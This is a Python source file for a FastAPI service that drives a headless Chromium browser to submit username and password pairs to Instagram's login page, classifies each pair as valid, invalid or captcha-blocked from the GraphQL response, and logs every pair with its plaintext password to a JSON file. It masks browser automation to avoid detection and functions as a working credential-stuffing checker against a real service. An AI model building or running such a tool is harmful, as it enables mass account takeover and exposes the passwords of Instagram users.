import asyncio
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional

from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn
from playwright.async_api import async_playwright, Browser, BrowserContext, Page, Playwright

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("ig-worker")

app = FastAPI(title="IG CAA Login Auth Worker", version="1.0.0")

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")

URL_LOGIN = "https://www.instagram.com/?flo=true"
SELECTOR_USERNAME = "input[name='email'], input[name='username'], input[type='text']"
SELECTOR_PASSWORD = "input[name='pass'], input[name='password'], input[type='password']"
SELECTOR_SUBMIT = "button[type='submit'], input[type='submit']"


class TesteRequest(BaseModel):
    usuario: str
    senha: str


class WorkerState:
    playwright: Optional[Playwright] = None
    browser: Optional[Browser] = None
    context: Optional[BrowserContext] = None
    page: Optional[Page] = None
    is_ready: bool = False
    lock: asyncio.Lock = asyncio.Lock()


state = WorkerState()


async def obter_browser():
    """Garante instância conectada do Chromium com auto-recovery."""
    try:
        if state.browser and state.browser.is_connected():
            return state.browser
    except Exception:
        pass

    logger.info("[WARM WORKER] Conectando motor Chromium Playwright...")
    try:
        if state.playwright:
            try:
                await state.playwright.stop()
            except Exception:
                pass
        state.playwright = await async_playwright().start()
        state.browser = await state.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage"
            ]
        )
        state.context = None
        state.page = None
    except Exception as e:
        logger.error(f"[WARM WORKER] Falha ao iniciar browser: {e}")
        raise e
    return state.browser


async def preparar_pagina():
    """Pré-carrega o formulário CAA Login com isolamento de sessão (clear_cookies)."""
    try:
        state.is_ready = False
        await obter_browser()

        # Cria novo contexto se necessário ou limpa cookies existentes (Zero Test Pollution)
        if not state.context:
            state.context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800},
                locale="pt-BR"
            )
        else:
            try:
                await state.context.clear_cookies()
            except Exception:
                pass

        # Tenta reaproveitar a página existente
        if state.page and not state.page.is_closed():
            try:
                logger.info("[WARM WORKER] Reciclando aba em memória...")
                await state.page.goto(URL_LOGIN, wait_until="networkidle", timeout=25000)
                await state.page.wait_for_selector(SELECTOR_USERNAME, state="attached", timeout=15000)
                await state.page.wait_for_selector(SELECTOR_PASSWORD, state="attached", timeout=15000)
                state.is_ready = True
                logger.info("[WARM WORKER] ✅ Aba 100% pronta e reciclada para teste instantâneo!")
                return
            except Exception as rec_err:
                logger.warning(f"[WARM WORKER] Falha ao reciclar aba: {rec_err}. Recriando...")
                try:
                    await state.page.close()
                except Exception:
                    pass

        state.page = await state.context.new_page()
        logger.info("[WARM WORKER] Carregando interface CAA Login do Instagram...")
        await state.page.goto(URL_LOGIN, wait_until="networkidle", timeout=30000)
        await state.page.wait_for_selector(SELECTOR_USERNAME, state="attached", timeout=15000)
        await state.page.wait_for_selector(SELECTOR_PASSWORD, state="attached", timeout=15000)

        state.is_ready = True
        logger.info("[WARM WORKER] ✅ Página 100% pronta e pré-aquecida para autenticação instantânea!")
    except Exception as e:
        logger.error(f"[WARM WORKER] Erro ao pré-aquecer página: {e}")
        state.is_ready = False
        await asyncio.sleep(2)
        asyncio.create_task(preparar_pagina())


@app.on_event("startup")
async def startup_event():
    asyncio.create_task(preparar_pagina())


@app.on_event("shutdown")
async def shutdown_event():
    logger.info("[WARM WORKER] Encerrando Chromium e Playwright...")
    if state.page and not state.page.is_closed():
        await state.page.close()
    if state.context:
        await state.context.close()
    if state.browser:
        await state.browser.close()
    if state.playwright:
        await state.playwright.stop()


@app.get("/health")
async def health():
    return {
        "status": "ready" if state.is_ready else "warming",
        "has_browser": state.browser is not None and state.browser.is_connected() if state.browser else False,
        "is_ready": state.is_ready
    }


def salvar_resultado_local(usuario: str, senha: str, valido: bool, status_credencial: str, mensagem: str, url_final: str = "", error_code: Optional[int] = None):
    novo_log = {
        "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "valido": valido,
        "status_credencial": status_credencial,
        "nome": usuario,
        "usuario": usuario,
        "senha": senha,
        "mensagem": mensagem,
        "error_code": error_code,
        "url_final": url_final
    }

    logs = []
    if RESULTADO_JSON.exists():
        try:
            with open(RESULTADO_JSON, "r", encoding="utf-8-sig") as f:
                logs = json.load(f)
                if not isinstance(logs, list):
                    logs = []
        except Exception:
            logs = []

    logs.append(novo_log)
    try:
        with open(RESULTADO_JSON, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Erro ao gravar resultado.json: {e}")


@app.post("/testar")
async def testar_credenciais(req: TesteRequest):
    usuario = req.usuario.strip()
    senha = req.senha

    async with state.lock:
        if not state.is_ready or not state.page or state.page.is_closed():
            logger.warning("[WARM WORKER] Página não pronta, aguardando carregamento...")
            await preparar_pagina()

        page = state.page
        inicio = asyncio.get_event_loop().time()
        logger.info(f"[WARM WORKER] Testando instantaneamente: {usuario}")

        captured_graphql = {}

        async def on_response(response):
            if "/api/graphql" in response.url and response.request.method == "POST":
                try:
                    body = await response.json()
                    if isinstance(body, dict) and "data" in body and isinstance(body["data"], dict):
                        if "caa_login_web" in body["data"]:
                            captured_graphql["caa_login_web"] = body["data"]["caa_login_web"]
                except Exception:
                    pass

        # Registra listener para capturar mutação GraphQL
        page.on("response", on_response)

        try:
            # 1. Preenchimento instantâneo (Aba já está aberta no formulário)
            await page.fill(SELECTOR_USERNAME, usuario)
            await page.fill(SELECTOR_PASSWORD, senha)

            # 2. Submissão via Enter
            try:
                await page.press(SELECTOR_PASSWORD, "Enter")
            except Exception:
                await page.click(SELECTOR_SUBMIT)

            # 3. Aguarda resposta GraphQL ou transição de rota
            resultado_valido = False
            status_credencial = "invalido"
            msg_resultado = "Falha na validação"
            error_code_detectado = None

            for _ in range(30):  # até ~9s
                await asyncio.sleep(0.3)
                if "caa_login_web" in captured_graphql:
                    break
                url_atual = page.url
                if "two_factor" in url_atual or "challenge" in url_atual:
                    break

            url_final = page.url
            caa = captured_graphql.get("caa_login_web")

            if caa:
                error_code = caa.get("error_code")
                error_code_detectado = error_code
                error_msg = caa.get("error_message")
                err_text = ""
                if isinstance(error_msg, dict):
                    err_text = error_msg.get("text", "")

                two_factor = caa.get("two_factor_result")
                recaptcha = caa.get("recaptcha_needed") or caa.get("is_ig_login_recaptcha")
                authed = caa.get("ig_authenticated")

                if error_code == 1348009 or (error_code is not None and error_code != 0):
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = err_text or f"Senha incorreta (error_code: {error_code})"
                elif recaptcha:
                    resultado_valido = False
                    status_credencial = "bloqueio_captcha"
                    msg_resultado = "Desafio Captcha da Meta acionado"
                elif two_factor is not None:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "2FA Requerido - Etapa de código encontrada"
                elif authed is True:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Autenticação direta bem-sucedida"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = err_text or "Credencial não autenticada no Instagram"
            else:
                # Fallback por URL
                if "two_factor" in url_final or "challenge" in url_final:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - rota de 2FA alcançada"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = "Login inválido ou etapa de código não encontrada"

            duracao = asyncio.get_event_loop().time() - inicio
            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {status_credencial.upper()} ({msg_resultado})")

            # Salva no log local
            salvar_resultado_local(usuario, senha, resultado_valido, status_credencial, msg_resultado, url_final, error_code_detectado)

            # Agenda pré-aquecimento assíncrono para a próxima requisição
            asyncio.create_task(preparar_pagina())

            return {
                "success": True,
                "usuario": usuario,
                "valido": resultado_valido,
                "status_credencial": status_credencial,
                "mensagem": msg_resultado,
                "error_code": error_code_detectado,
                "tempo_segundos": round(duracao, 2),
                "url_final": url_final
            }

        except Exception as err:
            logger.error(f"[WARM WORKER] Falha na execução: {err}")
            asyncio.create_task(preparar_pagina())
            return {
                "success": False,
                "usuario": usuario,
                "valido": False,
                "status_credencial": "invalido",
                "mensagem": f"Erro interno no worker: {err}"
            }


if __name__ == "__main__":
    uvicorn.run("bot_service:app", host="127.0.0.1", port=3006, log_level="info")
